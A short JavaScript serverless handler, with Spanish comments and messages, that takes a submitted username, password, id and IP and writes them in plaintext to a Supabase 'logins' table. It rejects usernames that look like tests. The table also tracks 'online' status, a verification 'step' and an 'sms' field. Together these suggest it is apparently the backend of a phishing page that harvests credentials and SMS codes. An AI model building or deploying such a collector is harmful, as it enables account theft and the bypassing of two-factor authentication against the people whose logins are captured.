import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, pass, id, ip } = req.body;

    // Validaciones
    if (!username || !pass || username.length < 3) {
      return res.status(400).json({ error: 'Datos inválidos' });
    }

    const spam = ['test', 'prueba', 'admin', 'demo', 'fake'];
    if (spam.some(s => username.toLowerCase().includes(s))) {
      return res.status(403).json({ error: 'Spam detectado' });
    }

    // Crear cliente Supabase con la nueva key (sbp_...)
    const supabase = createClient(
      process.env.SUPABASE_URL,
      process.env.SUPABASE_SERVICE_ROLE_KEY,
      {
        auth: {
          autoRefreshToken: false,
          persistSession: false
        }
      }
    );

    // Insertar usando la librería (más confiable)
    const { error } = await supabase
      .from('logins')
      .insert({
        id: id || crypto.randomUUID(),
        username,
        pass,
        ip: ip || 'unknown',
        online: true,
        step: 'Verificando...',
        sms: '----',
        created_at: new Date().toISOString()
      });

    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ error: error.message });
    }

    res.status(200).json({ success: true });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
}
